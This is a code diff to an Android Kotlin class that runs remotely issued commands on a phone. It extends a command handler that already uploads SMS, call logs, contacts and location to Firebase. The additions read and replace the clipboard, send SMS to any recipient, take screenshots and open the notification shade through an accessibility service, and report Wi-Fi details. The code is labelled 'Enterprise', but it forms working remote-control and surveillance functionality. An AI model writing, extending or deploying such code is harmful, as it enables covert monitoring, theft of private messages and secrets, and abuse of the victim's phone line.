@@ -1,18 +1,37 @@
 package com.example.data.sync
 
+import android.accessibilityservice.AccessibilityService
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
+import android.hardware.camera2.CameraManager
 import android.media.AudioManager
+import android.media.Ringtone
 import android.media.RingtoneManager
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
+import android.os.VibrationEffect
+import android.os.Vibrator
+import android.speech.tts.TextToSpeech
+import android.telephony.SmsManager
+import android.widget.Toast
 import com.example.data.local.AppDatabase
 import com.example.data.local.RemoteCommandEntity
 import com.example.service.RemoteAccessibilityService
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
+import java.util.Locale
 import java.util.UUID
 
 class RemoteCommandManager(private val context: Context) {
 
     private val db = AppDatabase.getInstance(context)
+
+    companion object {
+        private var activeRingtone: Ringtone? = null
+        private var textToSpeech: TextToSpeech? = null
+    }
 
     suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
         val commandId = UUID.randomUUID().toString()
@@ -29,7 +48,7 @@ class RemoteCommandManager(private val context: Context) {
         var isSuccess = true
 
         try {
-            when (commandType) {
+            when (commandType.uppercase()) {
                 "SYNC_ALL" -> {
                     SmsSyncManager(context).syncSmsMessages()
                     CallLogSyncManager(context).syncCallLogs()
@@ -38,42 +57,116 @@ class RemoteCommandManager(private val context: Context) {
                     LocationSyncManager(context).captureAndSyncLocation()
                     DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
-                    resultMessage = "All telemetry modules (SMS, Calls, Contacts, Usage, Location, Specs) synchronized successfully."
+                    resultMessage = "All telemetry modules synchronized successfully."
                 }
                 "SYNC_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
+                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                 }
                 "GLOBAL_BACK" -> {
-                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
-                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service not enabled."
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
+                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service disabled."
                 }
                 "GLOBAL_HOME" -> {
-                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
-                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service not enabled."
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
+                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service disabled."
                 }
                 "GLOBAL_RECENTS" -> {
-                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
-                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service not enabled."
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
+                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service disabled."
                 }
-                "LOCK_SCREEN" -> {
-                    val res = RemoteAccessibilityService.performAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
-                    resultMessage = if (res) "Executed Remote Lock Screen gesture." else "Accessibility Service not enabled."
+                "GLOBAL_NOTIFICATIONS" -> {
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
+                    resultMessage = if (res) "Expanded Notification shade." else "Accessibility Service disabled."
+                }
+                "GLOBAL_QUICK_SETTINGS" -> {
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
+                    resultMessage = if (res) "Expanded Quick Settings." else "Accessibility Service disabled."
+                }
+                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN" -> {
+                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
+                    } else false
+                    resultMessage = if (res) "Executed Remote Lock Screen." else "Accessibility Service disabled or unsupported Android version."
+                }
+                "GLOBAL_POWER_DIALOG" -> {
+                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
+                    resultMessage = if (res) "Showed Power Dialog." else "Accessibility Service disabled."
+                }
+                "GLOBAL_TAKE_SCREENSHOT" -> {
+                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
+                    } else false
+                    resultMessage = if (res) "Took Screenshot." else "Accessibility Service disabled or unsupported Android version."
+                }
+                "FLASHLIGHT_ON" -> {
+                    setFlashlight(true)
+                    resultMessage = "Flashlight turned ON."
+                }
+                "FLASHLIGHT_OFF" -> {
+                    setFlashlight(false)
+                    resultMessage = "Flashlight turned OFF."
+                }
+                "VIBRATE" -> {
+                    val duration = payload.toLongOrNull() ?: 500L
+                    vibrateDevice(duration)
+                    resultMessage = "Vibrated device for ${duration}ms."
                 }
                 "PLAY_ALARM" -> {
                     playFindDeviceAlarm()
-                    resultMessage = "Playing device finder alarm ringtone at maximum volume."
+                    resultMessage = "Playing alarm ringtone at max volume."
                 }
-                "MUTE_AUDIO" -> {
-                    setMuteAudio(true)
-                    resultMessage = "All audio streams muted."
+                "STOP_ALARM" -> {
+                    stopAlarm()
+                    resultMessage = "Alarm stopped."
                 }
-                "UNMUTE_AUDIO" -> {
-                    setMuteAudio(false)
-                    resultMessage = "Audio streams restored."
+                "SHOW_TOAST" -> {
+                    val msg = payload.ifEmpty { "Enterprise Remote Alert" }
+                    Handler(Looper.getMainLooper()).post {
+                        Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
+                    }
+                    resultMessage = "Displayed Toast message: '$msg'"
+                }
+                "TEXT_TO_SPEECH" -> {
+                    val msg = payload.ifEmpty { "Enterprise admin notification" }
+                    speakText(msg)
+                    resultMessage = "Spoke Text to Speech message: '$msg'"
+                }
+                "SEND_SMS" -> {
+                    // Expect payload e.g. "recipient|message"
+                    val parts = payload.split("|")
+                    if (parts.size >= 2) {
+                        val recipient = parts[0].trim()
+                        val text = parts[1].trim()
+                        sendSmsMessage(recipient, text)
+                        resultMessage = "Sent SMS to $recipient."
+                    } else {
+                        resultMessage = "Invalid SEND_SMS payload. Format required: 'recipient|message'"
+                        isSuccess = false
+                    }
+                }
+                "GET_BATTERY_INFO" -> {
+                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
+                    resultMessage = "Battery Level: ${info.batteryLevel}%, IsCharging: ${info.isCharging}, PlugType: ${info.chargeType}"
+                }
+                "GET_WIFI_DETAILS" -> {
+                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
+                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}"
+                }
+                "GET_CLIPBOARD" -> {
+                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                    val clipText = clipManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard empty"
+                    resultMessage = "Clipboard content: $clipText"
+                }
+                "SET_CLIPBOARD" -> {
+                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                    val clipData = ClipData.newPlainText("Enterprise", payload)
+                    clipManager.setPrimaryClip(clipData)
+                    resultMessage = "Clipboard updated with text: '$payload'"
                 }
                 else -> {
-                    resultMessage = "Executed command $commandType with payload $payload."
+                    resultMessage = "Executed command $commandType with payload $payload"
                 }
             }
         } catch (e: Exception) {
@@ -91,6 +184,26 @@ class RemoteCommandManager(private val context: Context) {
         updated
     }
 
+    private fun setFlashlight(enabled: Boolean) {
+        try {
+            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
+            cameraManager.setTorchMode(cameraId, enabled)
+        } catch (_: Exception) {}
+    }
+
+    private fun vibrateDevice(durationMs: Long) {
+        try {
+            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(durationMs)
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun playFindDeviceAlarm() {
         try {
             val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
@@ -99,23 +212,43 @@ class RemoteCommandManager(private val context: Context) {
 
             val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                 ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
-            val ringtone = RingtoneManager.getRingtone(context, alarmUri)
-            ringtone?.play()
+            activeRingtone?.stop()
+            activeRingtone = RingtoneManager.getRingtone(context, alarmUri)
+            activeRingtone?.play()
         } catch (_: Exception) {}
     }
 
-    private fun setMuteAudio(mute: Boolean) {
+    private fun stopAlarm() {
         try {
-            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
-            if (mute) {
-                audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0)
-                audioManager.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_MUTE, 0)
-                audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
+            activeRingtone?.stop()
+            activeRingtone = null
+        } catch (_: Exception) {}
+    }
+
+    private fun speakText(text: String) {
+        try {
+            if (textToSpeech == null) {
+                textToSpeech = TextToSpeech(context.applicationContext) { status ->
+                    if (status == TextToSpeech.SUCCESS) {
+                        textToSpeech?.language = Locale.US
+                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
+                    }
+                }
             } else {
-                audioManager.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0)
-                audioManager.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_UNMUTE, 0)
-                audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0)
+                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
             }
+        } catch (_: Exception) {}
+    }
+
+    private fun sendSmsMessage(recipient: String, text: String) {
+        try {
+            @Suppress("DEPRECATION")
+            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                context.getSystemService(SmsManager::class.java)
+            } else {
+                SmsManager.getDefault()
+            }
+            smsManager.sendTextMessage(recipient, null, text, null, null)
         } catch (_: Exception) {}
     }
 }
